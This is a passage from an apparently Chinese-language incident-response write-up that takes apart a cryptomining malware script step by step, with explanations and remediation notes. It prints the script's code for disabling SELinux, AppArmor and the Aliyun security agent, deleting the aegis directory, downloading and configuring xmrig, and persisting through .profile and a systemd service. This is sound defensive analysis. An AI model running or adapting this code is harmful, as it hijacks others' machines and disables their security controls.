<span class="line"><span>rm -rf /usr/local/aegis</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>解释</p><h3 id="解决-3" tabindex="-1"><a class="header-anchor" href="#解决-3"><span>解决</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>setenforce 0</span></span>
<span class="line"><span>echo SELINUX=disabled &gt;/etc/selinux/config</span></span>
<span class="line"><span>都是</span></span>
<span class="line"><span>恢复之前的文件：</span></span>
<span class="line"><span></span></span>
<span class="line"><span># vi /etc/selinux/config</span></span>
<span class="line"><span></span></span>
<span class="line"><span>SELINUX=disabled</span></span>
<span class="line"><span>SELINUXTYPE=targeted</span></span>
<span class="line"><span></span></span>
<span class="line"><span>systemctl disable apparmor</span></span>
<span class="line"><span>恢复，本机没有安装，所以不生效。</span></span>
<span class="line"><span>systemctl status apparmor</span></span>
<span class="line"><span>systemctl enable apparmor</span></span>
<span class="line"><span></span></span>
<span class="line"><span>service aliyun.service stop</span></span>
<span class="line"><span>systemctl disable aliyun.service</span></span>
<span class="line"><span>恢复：</span></span>
<span class="line"><span>systemctl start aliyun.service</span></span>
<span class="line"><span>systemctl status aliyun.service</span></span>
<span class="line"><span>systemctl enable aliyun.service</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>aegis目录没有被删掉。</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span># ll /usr/local/aegis</span></span>
<span class="line"><span>total 28</span></span>
<span class="line"><span>drwxr-xr-x 5 root root 4096 Mar 31 21:31 aegis_client</span></span>
<span class="line"><span>srwxr-xr-x 1 root root    0 Mar 31 21:31 Aegis-&lt;Guid(5A2C30A2-A87D-490A-9281-6765EDAD7CBA)&gt;</span></span>
<span class="line"><span>drwxr-xr-x 3 root root 4096 May 15 11:50 aegis_update</span></span>
<span class="line"><span>drwxr-xr-x 3 root root 4096 Feb 10  2023 AliSecGuard</span></span>
<span class="line"><span>drwxr-xr-x 5 root root 4096 Aug 17 11:55 globalcfg</span></span>
<span class="line"><span>drwxr-xr-x 8 root root 4096 Aug 17 13:24 PythonLoader</span></span>
<span class="line"><span>drwxr-xr-x 7 root root 4096 Apr 24 10:18 PythonLoaderTemp</span></span>
<span class="line"><span>drwxr-xr-x 3 root root 4096 Dec 19  2021 SecureCheck</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="_8-安装-mining-脚本" tabindex="-1"><a class="header-anchor" href="#_8-安装-mining-脚本"><span>8.安装 mining 脚本</span></a></h2><h3 id="恶意代码-7" tabindex="-1"><a class="header-anchor" href="#恶意代码-7"><span>恶意代码</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>#set up RR mining script</span></span>
<span class="line"><span></span></span>
<span class="line"><span>if [ &quot;$(id -u)&quot; == &quot;0&quot; ]; then</span></span>
<span class="line"><span>  echo &quot;WARNING: Generally it is not adviced to run this script under root&quot;</span></span>
<span class="line"><span>fi</span></span>
<span class="line"><span></span></span>
<span class="line"><span>WALLET=123456789abcd #做了处理</span></span>
<span class="line"><span>EMAIL=$1 # this one is optional</span></span>
<span class="line"><span></span></span>
<span class="line"><span># active 1GB pages</span></span>
<span class="line"><span>sysctl -w vm.nr_hugepages=$(nproc)</span></span>
<span class="line"><span></span></span>
<span class="line"><span>for i in $(find /sys/devices/system/node/node* -maxdepth 0 -type d);</span></span>
<span class="line"><span>do</span></span>
<span class="line"><span>    echo 3 &gt; &quot;$i/hugepages/hugepages-1048576kB/nr_hugepages&quot;;</span></span>
<span class="line"><span>done</span></span>
<span class="line"><span></span></span>
<span class="line"><span>echo &quot;1GB pages successfully enabled&quot;</span></span>
<span class="line"><span></span></span>
<span class="line"><span># checking prerequisites</span></span>
<span class="line"><span></span></span>
<span class="line"><span>if [ -z $WALLET ]; then</span></span>
<span class="line"><span>  echo &quot;Script usage:&quot;</span></span>
<span class="line"><span>  echo &quot;&gt; setup_rr_miner.sh &lt;wallet address&gt; [&lt;your email address&gt;]&quot;</span></span>
<span class="line"><span>  echo &quot;ERROR: Please specify your wallet address&quot;</span></span>
<span class="line"><span>  exit 1</span></span>
<span class="line"><span>fi</span></span>
<span class="line"><span></span></span>
<span class="line"><span>WALLET_BASE=`echo $WALLET | cut -f1 -d&quot;.&quot;`</span></span>
<span class="line"><span>if [ ${#WALLET_BASE} != 95 -a ${#WALLET_BASE} != 34 ]; then</span></span>
<span class="line"><span>  echo &quot;ERROR: Wrong wallet base address length (should be 95 or 34): ${#WALLET_BASE}&quot;</span></span>
<span class="line"><span>  exit 1</span></span>
<span class="line"><span>fi</span></span>
<span class="line"><span></span></span>
<span class="line"><span>if [ -z $RRHOME ]; then</span></span>
<span class="line"><span>  echo &quot;ERROR: Please define HOME environment variable to your home directory&quot;</span></span>
<span class="line"><span>  exit 1</span></span>
<span class="line"><span>fi</span></span>
<span class="line"><span></span></span>
<span class="line"><span>if [ ! -d $RRHOME ]; then</span></span>
<span class="line"><span>  echo &quot;ERROR: Please make sure HOME directory $RRHOME exists or set it yourself using this command:&quot;</span></span>
<span class="line"><span>  echo &#39;  export RRHOME=&lt;dir&gt;&#39;</span></span>
<span class="line"><span>  exit 1</span></span>
<span class="line"><span>fi</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="解释" tabindex="-1"><a class="header-anchor" href="#解释"><span>解释：</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>#set up RR mining script</span></span>
<span class="line"><span></span></span>
<span class="line"><span>if [ &quot;$(id -u)&quot; == &quot;0&quot; ]; then</span></span>
<span class="line"><span>  echo &quot;WARNING: Generally it is not adviced to run this script under root&quot;</span></span>
<span class="line"><span>fi</span></span>
<span class="line"><span>判断用户如果是root，弹出警告，不建议用root用户运行。</span></span>
<span class="line"><span></span></span>
<span class="line"><span>WALLET=123456789abcd #做了处理</span></span>
<span class="line"><span>EMAIL=$1 # this one is optional</span></span>
<span class="line"><span></span></span>
<span class="line"><span># active 1GB pages</span></span>
<span class="line"><span>sysctl -w vm.nr_hugepages=$(nproc)</span></span>
<span class="line"><span></span></span>
<span class="line"><span>for i in $(find /sys/devices/system/node/node* -maxdepth 0 -type d);</span></span>
<span class="line"><span>do</span></span>
<span class="line"><span>    echo 3 &gt; &quot;$i/hugepages/hugepages-1048576kB/nr_hugepages&quot;;</span></span>
<span class="line"><span>done</span></span>
<span class="line"><span></span></span>
<span class="line"><span>echo &quot;1GB pages successfully enabled&quot;</span></span>
<span class="line"><span>这段代码的目的是在系统上启用 1GB 大页面（Huge Pages），以提高大内存工作负载的性能和效率。它通过设置 Huge Pages 数目并针对每个 NUMA 节点进行配置来实现这一目标。这可能是在进行内存优化和性能调整时使用的一部分脚本。</span></span>
<span class="line"><span></span></span>
<span class="line"><span></span></span>
<span class="line"><span># checking prerequisites</span></span>
<span class="line"><span></span></span>
<span class="line"><span>if [ -z $WALLET ]; then</span></span>
<span class="line"><span>  echo &quot;Script usage:&quot;</span></span>
<span class="line"><span>  echo &quot;&gt; setup_rr_miner.sh &lt;wallet address&gt; [&lt;your email address&gt;]&quot;</span></span>
<span class="line"><span>  echo &quot;ERROR: Please specify your wallet address&quot;</span></span>
<span class="line"><span>  exit 1</span></span>
<span class="line"><span>fi</span></span>
<span class="line"><span>这段代码用于检查用户在执行脚本时是否提供了有效的钱包地址（通过检查变量 $WALLET 是否为空）。如果用户未提供钱包地址，脚本将输出使用说明和示例命令，并输出错误消息，然后终止执行。这有助于确保脚本在正确的输入参数下才会继续执行，避免因缺少必要的信息而导致问题。</span></span>
<span class="line"><span></span></span>
<span class="line"><span></span></span>
<span class="line"><span>WALLET_BASE=`echo $WALLET | cut -f1 -d&quot;.&quot;`</span></span>
<span class="line"><span>if [ ${#WALLET_BASE} != 95 -a ${#WALLET_BASE} != 34 ]; then</span></span>
<span class="line"><span>  echo &quot;ERROR: Wrong wallet base address length (should be 95 or 34): ${#WALLET_BASE}&quot;</span></span>
<span class="line"><span>  exit 1</span></span>
<span class="line"><span>fi</span></span>
<span class="line"><span>这段代码用于检查给定的钱包地址的基本部分的长度是否符合要求。如果长度既不是 95 也不是 34，脚本将输出错误消息，并终止执行。</span></span>
<span class="line"><span></span></span>
<span class="line"><span>if [ -z $RRHOME ]; then</span></span>
<span class="line"><span>  echo &quot;ERROR: Please define HOME environment variable to your home directory&quot;</span></span>
<span class="line"><span>  exit 1</span></span>
<span class="line"><span>fi</span></span>
<span class="line"><span>这段代码用于检查是否定义了环境变量 $RRHOME，并在该变量未定义时输出错误消息，然后终止执行</span></span>
<span class="line"><span></span></span>
<span class="line"><span>if [ ! -d $RRHOME ]; then</span></span>
<span class="line"><span>  echo &quot;ERROR: Please make sure HOME directory $RRHOME exists or set it yourself using this command:&quot;</span></span>
<span class="line"><span>  echo &#39;  export RRHOME=&lt;dir&gt;&#39;</span></span>
<span class="line"><span>  exit 1</span></span>
<span class="line"><span>fi</span></span>
<span class="line"><span>跟上一段差不多。</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="解决-4" tabindex="-1"><a class="header-anchor" href="#解决-4"><span>解决</span></a></h3><p>基本只是检查条件，不需要安全操作</p><h2 id="_9-安装curl-wget" tabindex="-1"><a class="header-anchor" href="#_9-安装curl-wget"><span>9.安装curl, wget</span></a></h2><p>如果没有安装则安装 curl, wget</p><h3 id="恶意代码-8" tabindex="-1"><a class="header-anchor" href="#恶意代码-8"><span>恶意代码</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>#check curl, wget</span></span>
<span class="line"><span>if ! command -v curl &amp;&gt; /dev/null</span></span>
<span class="line"><span>then</span></span>
<span class="line"><span>    echo &quot;curl could not be found, will install...&quot;</span></span>
<span class="line"><span>    apt-get install curl -y</span></span>
<span class="line"><span>    yum install curl -y</span></span>
<span class="line"><span>fi</span></span>
<span class="line"><span>if ! command -v wget &amp;&gt; /dev/null</span></span>
<span class="line"><span>then</span></span>
<span class="line"><span>    echo &quot;wget could not be found, will install...&quot;</span></span>
<span class="line"><span>    apt-get install wget -y</span></span>
<span class="line"><span>    yum install wget -y</span></span>
<span class="line"><span>fi</span></span>
<span class="line"><span></span></span>
<span class="line"><span>if ! type lscpu &gt;/dev/null; then</span></span>
<span class="line"><span>  echo &quot;WARNING: This script requires \&quot;lscpu\&quot; utility to work correctly&quot;</span></span>
<span class="line"><span>fi</span></span>
<span class="line"><span>这段代码用于检查是否安装了名为 lscpu 的命令行工具。如果未安装，脚本将输出警告消息，提醒用户脚本需要该工具才能正常运行。</span></span>
<span class="line"><span># lscpu -V</span></span>
<span class="line"><span># lscpu from util-linux 2.23.2</span></span>
<span class="line"><span></span></span>
<span class="line"><span>if ! sudo -n true 2&gt;/dev/null; then</span></span>
<span class="line"><span>  echo &quot;Since I can&#39;t do passwordless sudo, mining in background will started from your $RRHOME/.profile file first time you login this host after reboot.&quot;</span></span>
<span class="line"><span>else</span></span>
<span class="line"><span>  echo &quot;Mining in background will be performed using moneroocean_miner systemd service.&quot;</span></span>
<span class="line"><span>fi</span></span>
<span class="line"><span>这段代码用于检查是否可以进行无密码 sudo，根据结果输出不同的消息。如果无法进行无密码 sudo，则说明后台挖矿将在用户首次登录主机后通过 .profile 文件启动。如果可以进行无密码 sudo，则说明后台挖矿将使用 systemd 服务来执行。</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="解决-5" tabindex="-1"><a class="header-anchor" href="#解决-5"><span>解决</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>无需操作</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h2 id="_10-安装挖矿软件" tabindex="-1"><a class="header-anchor" href="#_10-安装挖矿软件"><span>10.安装挖矿软件</span></a></h2><h3 id="恶意代码和解释" tabindex="-1"><a class="header-anchor" href="#恶意代码和解释"><span>恶意代码和解释</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span># start doing stuff: preparing miner</span></span>
<span class="line"><span></span></span>
<span class="line"><span>echo &quot;[*] Removing previous rr miner (if any)&quot;</span></span>
<span class="line"><span>if sudo -n true 2&gt;/dev/null; then</span></span>
<span class="line"><span>  sudo systemctl stop xmrig.service</span></span>
<span class="line"><span>fi</span></span>
<span class="line"><span>killall -9 xmrig</span></span>
<span class="line"><span></span></span>
<span class="line"><span>这段代码用于移除之前可能存在的 RR 矿工（RiskReward 矿工），首先尝试通过无密码 sudo 停止相关的 systemd 服务（如果条件成立），然后通过 killall 命令强制终止 xmrig 进程。</span></span>
<span class="line"><span></span></span>
<span class="line"><span>echo &quot;[*] Looking for the latest version of Xmrig miner&quot;</span></span>
<span class="line"><span>LATEST_XMRIG_LINUX_RELEASE=&quot;https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-static-x64.tar.gz&quot;</span></span>
<span class="line"><span>echo &quot;[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to /tmp/xmrig.tar.gz&quot;</span></span>
<span class="line"><span>if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o /tmp/xmrig.tar.gz; then</span></span>
<span class="line"><span>  echo &quot;ERROR: Can&#39;t download $LATEST_XMRIG_LINUX_RELEASE file to /tmp/xmrig.tar.gz&quot;</span></span>
<span class="line"><span>  exit 1</span></span>
<span class="line"><span>fi</span></span>
<span class="line"><span>这段代码用于从指定的链接下载最新版本的 Xmrig 矿工软件，将其保存到临时文件 /tmp/xmrig.tar.gz。如果下载失败，脚本将输出错误消息并终止执行。</span></span>
<span class="line"><span></span></span>
<span class="line"><span></span></span>
<span class="line"><span>echo &quot;[*] Unpacking /tmp/xmrig.tar.gz to $RRHOME&quot;</span></span>
<span class="line"><span>if ! tar xf /tmp/xmrig.tar.gz -C $RRHOME --strip=1; then</span></span>
<span class="line"><span>  echo &quot;WARNING: Can&#39;t unpack /tmp/xmrig.tar.gz to $RRHOME directory&quot;</span></span>
<span class="line"><span>fi</span></span>
<span class="line"><span>rm /tmp/xmrig.tar.gz</span></span>
<span class="line"><span></span></span>
<span class="line"><span>这段代码用于解压缩下载的 Xmrig 矿工软件并将其放置到指定目录 $RRHOME 中。如果解压缩失败，脚本将输出警告消息。</span></span>
<span class="line"><span></span></span>
<span class="line"><span>chmod +x $RRHOME/xmrig</span></span>
<span class="line"><span>chmod +x $RRHOME/config.json</span></span>
<span class="line"><span></span></span>
<span class="line"><span>echo &quot;[*] Miner $RRHOME/xmrig is OK&quot;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>sed -i &#39;s/&quot;url&quot;: *&quot;[^&quot;]*&quot;,/&quot;url&quot;: &quot;XXX.XXXXXXX.com:5555&quot;,/&#39; $RRHOME/config.json</span></span>
<span class="line"><span>sed -i &#39;s/&quot;1gb-pages&quot;: *false,/&quot;1gb-pages&quot;: true,/&#39; $RRHOME/config.json</span></span>
<span class="line"><span>sed -i &#39;s/&quot;algo&quot;: *null,/&quot;algo&quot;: &quot;gr&quot;,/&#39; $RRHOME/config.json</span></span>
<span class="line"><span>sed -i &#39;s/&quot;tls&quot;: *false,/&quot;tls&quot;: true,/&#39; $RRHOME/config.json</span></span>
<span class="line"><span>sed -i &#39;s/&quot;keepalive&quot;: *false,/&quot;keepalive&quot;: true,/&#39; $RRHOME/config.json</span></span>
<span class="line"><span>sed -i &#39;s/&quot;user&quot;: *&quot;[^&quot;]*&quot;,/&quot;user&quot;: &quot;&#39;$WALLET&#39;.0x22&quot;,/&#39; $RRHOME/config.json</span></span>
<span class="line"><span>sed -i &#39;s/&quot;max-cpu-usage&quot;: *[^,]*,/&quot;max-cpu-usage&quot;: 100,/&#39; $RRHOME/config.json</span></span>
<span class="line"><span>sed -i &#39;s#&quot;log-file&quot;: *null,#&quot;log-file&quot;: &quot;&#39;$RRHOME/xmrig.log&#39;&quot;,#&#39; $RRHOME/config.json</span></span>
<span class="line"><span>sed -i &#39;s/&quot;syslog&quot;: *[^,]*,/&quot;syslog&quot;: true,/&#39; $RRHOME/config.json</span></span>
<span class="line"><span>sed -i &#39;s/&quot;max-threads-hint&quot;: *[^,]*,/&quot;max-threads-hint&quot;: 75,/&#39; $RRHOME/config.json</span></span>
<span class="line"><span>sed -i &#39;s/&quot;max-threads-hint&quot;: *[^,]*,/&quot;max-threads-hint&quot;: 75,/&#39; $RRHOME/config_background.json</span></span>
<span class="line"><span># 修改配置文件</span></span>
<span class="line"><span></span></span>
<span class="line"><span>cp $RRHOME/config.json $RRHOME/config_background.json</span></span>
<span class="line"><span>sed -i &#39;s/&quot;background&quot;: *false,/&quot;background&quot;: true,/&#39; $RRHOME/config_background.json</span></span>
<span class="line"><span></span></span>
<span class="line"><span># preparing script</span></span>
<span class="line"><span></span></span>
<span class="line"><span>echo &quot;[*] Creating $RRHOME/miner.sh script&quot;</span></span>
<span class="line"><span>cat &gt;$RRHOME/miner.sh &lt;&lt;EOL</span></span>
<span class="line"><span>#!/bin/bash</span></span>
<span class="line"><span>if ! pidof xmrig &gt;/dev/null; then</span></span>
<span class="line"><span>  nice $RRHOME/xmrig \$*</span></span>
<span class="line"><span>else</span></span>
<span class="line"><span>  echo &quot;RAPTOREUM miner is already running in the background. Refusing to run another one.&quot;</span></span>
<span class="line"><span>  echo &quot;Run \&quot;killall xmrig\&quot; or \&quot;sudo killall xmrig\&quot; if you want to remove background miner first.&quot;</span></span>
<span class="line"><span>fi</span></span>
<span class="line"><span>EOL</span></span>
<span class="line"><span></span></span>
<span class="line"><span>chmod +x $RRHOME/miner.sh</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="解决-6" tabindex="-1"><a class="header-anchor" href="#解决-6"><span>解决</span></a></h3><p>这段代码主要是安装 xmrig和修改配置文件</p><h2 id="_11-准备脚本后台运行和重启下工作" tabindex="-1"><a class="header-anchor" href="#_11-准备脚本后台运行和重启下工作"><span>11.准备脚本后台运行和重启下工作</span></a></h2><h3 id="恶意代码和解释-1" tabindex="-1"><a class="header-anchor" href="#恶意代码和解释-1"><span>恶意代码和解释</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span># preparing script background work and work under reboot</span></span>
<span class="line"><span></span></span>
<span class="line"><span>if ! sudo -n true 2&gt;/dev/null; then</span></span>
<span class="line"><span>  if ! grep miner.sh $RRHOME/.profile &gt;/dev/null; then</span></span>
<span class="line"><span>    echo &quot;[*] Adding $RRHOME/miner.sh script to $RRHOME/.profile&quot;</span></span>
<span class="line"><span>    echo &quot;$RRHOME/miner.sh --config=$RRHOME/config_background.json &gt;/dev/null 2&gt;&amp;1&quot; &gt;&gt;$RRHOME/.profile</span></span>
<span class="line"><span>  else </span></span>
<span class="line"><span>    echo &quot;Looks like $RRHOME/miner.sh script is already in the $RRHOME/.profile&quot;</span></span>
<span class="line"><span>  fi</span></span>
<span class="line"><span>  echo &quot;[*] Running miner in the background (see logs in $RRHOME/xmrig.log file)&quot;</span></span>
<span class="line"><span>  /bin/bash $RRHOME/miner.sh --config=$RRHOME/config_background.json &gt;/dev/null 2&gt;&amp;1</span></span>
<span class="line"><span>else</span></span>
<span class="line"><span></span></span>
<span class="line"><span>  if [[ $(grep MemTotal /proc/meminfo | awk &#39;{print $2}&#39;) -gt 3500000 ]]; then</span></span>
<span class="line"><span>    echo &quot;[*] Enabling huge pages&quot;</span></span>
<span class="line"><span>    echo &quot;vm.nr_hugepages=$((1168+$(nproc)))&quot; | sudo tee -a /etc/sysctl.conf</span></span>
<span class="line"><span>    sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc)))</span></span>
<span class="line"><span>  fi</span></span>
<span class="line"><span></span></span>
<span class="line"><span>  if ! type systemctl &gt;/dev/null; then</span></span>
<span class="line"><span></span></span>
<span class="line"><span>    echo &quot;[*] Running miner in the background (see logs in $RRHOME/xmrig.log file)&quot;</span></span>
<span class="line"><span>    /bin/bash $RRHOME/miner.sh --config=$RRHOME/config_background.json &gt;/dev/null 2&gt;&amp;1</span></span>
<span class="line"><span>    echo &quot;ERROR: This script requires \&quot;systemctl\&quot; systemd utility to work correctly.&quot;</span></span>
<span class="line"><span>    echo &quot;Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible.&quot;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>  else</span></span>
<span class="line"><span></span></span>
<span class="line"><span>    echo &quot;[*] Creating rr_miner systemd service&quot;</span></span>
<span class="line"><span>    cat &gt;/tmp/xmrig.service &lt;&lt;EOL</span></span>
<span class="line"><span>[Unit]</span></span>
<span class="line"><span>Description=RTM miner service</span></span>
<span class="line"><span></span></span>
<span class="line"><span>[Service]</span></span>
<span class="line"><span>ExecStart=$RRHOME/xmrig --config=$RRHOME/config.json</span></span>
<span class="line"><span>Restart=always</span></span>
<span class="line"><span>Nice=10</span></span>
<span class="line"><span>CPUWeight=1</span></span>
<span class="line"><span></span></span>
<span class="line"><span>[Install]</span></span>
<span class="line"><span>WantedBy=multi-user.target</span></span>
<span class="line"><span>EOL</span></span>
<span class="line"><span>    sudo mv /tmp/xmrig.service /etc/systemd/system/xmrig.service</span></span>
<span class="line"><span>    echo &quot;[*] Starting rr_miner systemd service&quot;</span></span>
<span class="line"><span>    sudo killall xmrig 2&gt;/dev/null</span></span>
<span class="line"><span>    sudo systemctl daemon-reload</span></span>
<span class="line"><span>    sudo systemctl enable xmrig.service</span></span>
<span class="line"><span>    sudo systemctl start xmrig.service</span></span>
<span class="line"><span>    echo &quot;To see miner service logs run \&quot;sudo journalctl -u rr_miner -f\&quot; command&quot;</span></span>
<span class="line"><span>  fi</span></span>
<span class="line"><span>fi</span></span>
<span class="line"><span></span></span>
<span class="line"><span>echo &quot;&quot;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>这段代码用于配置并准备矿工的后台工作，并根据系统环境和条件启动矿工服务。如果可以进行无密码 sudo，脚本会尝试将矿工脚本添加到用户的 .profile 文件中，并在后台运行矿工。如果系统内存足够大，脚本会启用大页面。如果不支持 systemctl，脚本会尝试在后台运行矿工。如果支持 systemctl，脚本会创建并启动 xmrig.service systemd 服务。</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="解决-7" tabindex="-1"><a 